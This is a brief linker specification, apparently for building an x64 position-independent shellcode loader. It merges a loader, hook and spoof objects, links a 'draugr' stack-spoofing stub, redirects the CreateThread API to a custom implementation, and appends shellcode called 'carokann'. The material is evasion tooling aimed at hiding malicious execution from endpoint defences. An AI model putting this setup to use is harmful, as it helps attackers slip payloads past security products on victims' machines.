x64:

	load "bin/loader.x64.o"
		make pic +gofirst

	# merge pic services
    run "services.spec"

	# Merge custom implementation of WinAPI calls to be spoofed
	load "bin/hook.x64.o"
		merge

	# Merge general spoof functions
	load "bin/spoof.x64.o"
        merge
	
	# Add and link ASM function draugr_stub
	load "bin/draugr.x64.bin"
		linkfunc "draugr_stub"

	#  Link CreateThread call to be spoofed with custom implementations in hook.c
	attach "KERNEL32$CreateThread"   "_CreateThread"

	# Add carokann shellcode to section 'carokann'
	run carokann.spec
		preplen
		link "carokann"

	export
